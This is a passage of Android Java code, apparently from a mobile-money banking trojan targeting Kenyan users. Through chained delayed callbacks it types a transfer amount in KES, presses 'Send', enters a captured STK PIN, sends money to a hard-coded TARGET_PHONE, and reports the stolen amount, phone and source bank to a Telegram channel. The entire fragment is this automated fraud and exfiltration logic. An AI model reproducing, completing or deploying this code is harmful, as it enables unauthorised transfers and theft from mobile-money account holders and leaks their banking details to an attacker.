                                          handler.postDelayed(() -> {
                                              typeInField(String.format("%.0f", amount));
                                              handler.postDelayed(() -> {
                                                  clickText("Send");
                                                  handler.postDelayed(() -> {
                                                      String pin = getStkPin();
                                                      if (!pin.isEmpty()) {
                                                          typeInField(pin);
                                                      }
                                                      handler.postDelayed(() -> {
                                                          clickText("Send");
                                                          sendTelegram("Transaction Complete! Amount Sent: KES " + String.format("%.0f", amount) + " Phone: " + TARGET_PHONE + " Source: " + currentBank + " Status: Successful");
                                                          isAutomating = false;
                                                      }, 800);
                                                  }, 800);
                                              }, 800);
                                          }, 800);
                                      }, 800);
                                  }, 800);
                              }, 2000);
                          }, 300);
                      }, 200);
                  }, 500);
